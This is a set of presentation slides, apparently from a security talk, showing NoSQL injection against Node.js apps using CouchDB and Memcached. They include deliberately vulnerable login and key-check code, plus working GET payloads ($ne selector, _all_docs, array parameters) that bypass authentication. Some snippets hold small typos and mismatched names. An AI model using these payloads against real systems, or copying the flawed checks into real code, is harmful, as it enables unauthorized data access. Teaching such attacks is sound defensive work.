<section>

  <!-- Chapter slide -->
  <section>
    <h3><blue>Backup</blue></h3>    <br>
    <h3><span class="fa-stack fa-lg">
      <i class="fa fa-square fa-stack-2x"></i>
      <i class="fa fa-hdd-o fa-stack-1x fa-inverse" style="line-height: 2em"></i>
    </span></h3>
  </section>

  <!-- Attacks - CouchDB - Special key injection -->
  <section>
    <h4><blue>CouchDB</blue> - Login Bypass</h4>
<pre class="fragment" data-fragment-index="1"><code class="javascript" data-trim data-noescape>
// NodeJS with Express.js
function checkCredentials(user, password, callback) {
  var options = {'selector': {'user': user, 'password': <span class="fragment highlight-blue" data-fragment-index="3">password</span>}}; 
  couch.use('users').get('_find', options, (err, res) => {
    callback(res.docs.length === 1);
  });

checkCredentials(req.query.user, req.query.password, handleResult);
</code></pre>

<code class="fragment code" data-fragment-index="2">
<blue><i class="fa fa-flash"></i></blue> GET login?user=patrick&password<span class="fragment highlight-blue" data-fragment-index="3">[%24ne]=</span> HTTP/1.1
</code>
<br></br>
<p class="fragment" data-fragment-index="4">Inject <strong>query selector</strong> to bypass password check!</p>

  </section>

  <!-- Attacks - CouchDB - Special key injection -->
  <section>
    <h4><blue>CouchDB</blue> - Login Bypass</h4>
    <span class="caption fragment" data-fragment-index="0">... then let's check the password within the application layer!</span class="caption">
<pre class="fragment" data-fragment-index="1"><code class="javascript" data-trim data-noescape>
// NodeJS with Express.js
function checkCredentials(user, password, callback) {
  nano.use('users').get(<span class="fragment highlight-blue" data-fragment-index="3">user</span>, (err, res)=> {
    callback(res.password === <span class="fragment highlight-blue" data-fragment-index="3">paasword</span>);
  });
}

checkUser(req.query.user, req.query.password, handleResult);
</code></pre>

<code class="fragment code" data-fragment-index="2">
<blue><i class="fa fa-flash"></i></blue> GET /login?user=<span class="fragment highlight-blue" data-fragment-index="3">_all_docs</span> HTTP/1.1
</code>
<br></br>
<p class="fragment" data-fragment-index="4">Use special <strong>_all_docs</strong> document with undefined password property!</p>

  </section>



  <!-- Attacks - CouchDB - Array key injection -->
  <section>
    <h4><blue>CouchDB</blue> - Check Bypass</h4>
    <span class="caption fragment" data-fragment-index="0">... then let's check the properties!</span class="caption">
<pre class="fragment" data-fragment-index="1"><code class="javascript" data-trim data-noescape>
// NodeJS with Express.js
function getDocument(key, callback) {
  if (<span class="fragment highlight-blue" data-fragment-index="4">key</span> === "secretDoc" || <span class="fragment highlight-blue" data-fragment-index="4">key[0]</span> === "_") {
    callback("Not authorized!");
  } else {
    couch.use('documents').get(key, callback);
  }
}

getDocument(req.query.key);
</code></pre>

<code class="fragment code" data-fragment-index="2">
<blue><i class="fa fa-flash"></i></blue> GET /get?user<span class="fragment highlight-blue" data-fragment-index="3">[]=secretDoc</span> HTTP/1.1<br>
<blue><i class="fa fa-flash"></i></blue> GET /get?user<span class="fragment highlight-blue" data-fragment-index="3">[]=_all_docs</span> HTTP/1.1
</code>
  </section>

  <!-- ######################## Memcached ######################## -->
  <section>
    <h4><blue>Memcached</blue> - Array Injection</h4>
<pre><code class="javascript" data-trim data-noescape>
function getCache(key) {
  if (<span class="fragment highlight-blue" data-fragment-index="4">key</span>.indexOf('auth_') === 0){
    callback("Invalid key!"); 
  } else {
    memcached.get(key, (err, body)=>{
      callback(err || body); 
    });
  }
}

getCache(req.query.key, handleResult);
</code></pre>

<code class="fragment code" data-fragment-index="2">
<blue><i class="fa fa-flash"></i></blue> GET ?/getCache?key<span class="fragment highlight-blue" data-fragment-index="3">[]=auth_patrick</span> HTTP/1.1
</code>
<br><br>
<p class="fragment">Array injection bypasses application layer checks!</p>

  </section>  
</section>